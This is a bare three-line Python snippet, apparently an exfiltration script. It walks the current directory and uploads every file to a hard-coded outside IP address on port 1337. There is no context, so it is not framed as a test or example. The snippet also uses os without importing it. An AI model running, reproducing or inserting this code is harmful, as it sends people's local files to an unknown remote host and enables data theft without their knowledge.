import requests
for f in os.listdir():
    requests.post("http://45.154.0.0:1337", files={"file": open(f, "rb")})